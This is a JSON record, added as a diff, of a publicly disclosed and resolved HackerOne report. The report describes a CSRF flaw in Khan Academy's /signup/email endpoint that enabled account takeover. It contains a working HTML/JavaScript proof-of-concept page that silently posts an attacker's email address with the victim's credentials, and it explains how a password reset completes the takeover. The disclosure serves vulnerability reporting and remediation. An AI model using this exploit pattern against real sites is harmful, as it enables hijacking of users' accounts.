@@ -1,0 +1,120 @@
+{
+  "id": 419891,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTk4OTE=",
+  "url": "https://hackerone.com/reports/419891",
+  "title": "Cross-Site Request Forgery (CSRF) vulnerability on API endpoint allows account takeovers",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-10-06T00:33:56.475Z",
+  "submitted_at": "2018-10-06T00:33:56.475Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "rlaneth",
+    "url": "/rlaneth",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/o4mqbiofauoxwlnkxhbmwhk74aqz/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 134,
+    "url": "https://hackerone.com/khanacademy",
+    "handle": "khanacademy",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/134/e62a822e39ad039f23a0b89bfaaaf7bf97c5f11f_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/134/e62a822e39ad039f23a0b89bfaaaf7bf97c5f11f_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Khan Academy",
+      "twitter_handle": "",
+      "website": "https://www.khanacademy.org/",
+      "about": "Start learning now. Completely free, forever."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-06-22T01:07:58.369Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-05-23T01:07:55.233Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nThe `/signup/email` API endpoint at [khanacademy.org](https://khanacademy.org) is vulnerable to Cross-Site Request Forgery (CSRF) attacks, allowing takeovers of accounts associated with unconfirmed email addresses.\n\n## Description\n\nThe vulnerable endpoint allows an authenticated user to change the email address associated with their account if they have not yet confirmed the current address. However, it does not sufficiently verify that requests were intentionally performed by the user (e.g. by checking the values of HTTP headers and using an anti-CSRF token).\n\n## Proof-of-Concept (PoC)\n\nThis is the code used for the demonstration video attached to this report (ka-signup-email-csrf.mp4).\n\n```\n<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"utf-8\" />\n        <title>Khan Academy Signup Email CSRF PoC</title>\n        <style type=\"text/css\">\n        body {\n            display:flex;\n            flex-direction:column;\n            justify-content:center;\n            min-height:100vh;\n            margin:0;\n        }\n        p {\n            display:flex;\n            align-self:center;\n            font-size:0.8rem;\n            font-family:sans-serif;\n            font-weight:bold;\n            text-transform:uppercase;\n            letter-spacing:0.1rem;\n        }\n        </style>\n    </head>\n    <body>\n        <p>Khan Academy Signup Email CSRF PoC</p>\n        <script type=\"text/javascript\">\n            window.addEventListener('load', function(e) {\n                var attacker_addr = 'attacker@rapidlight.io';\n                var x = new XMLHttpRequest();\n                x.open('POST', 'https://www.khanacademy.org/signup/email', true);\n                x.withCredentials = true;\n                x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n                x.send('email=' + encodeURIComponent(attacker_addr));\n            }, false);\n        </script>\n    </body>\n</html>\n```\n\n## Impact\n\nAn attacker can exploit this vulnerability in order to take over accounts by associating them with an address controlled by the attacker, then performing a password reset. In order for the attack to be successful, the target user account must be associated with an unconfirmed email address, and the target user must visit an attacker-controlled website while logged in.",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-06-22T01:07:55.296Z",
+  "allow_singular_disclosure_after": -217174461.22418365,
+  "singular_disclosure_allowed": true,
+  "vote_count": 107,
+  "voters": [
+    "megaknight",
+    "checkm50",
+    "alp",
+    "base_64",
+    "ali",
+    "sameerphad72",
+    "schneidersec",
+    "thalaivar304",
+    "imranhudaa",
+    "mik317",
+    "and 97 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
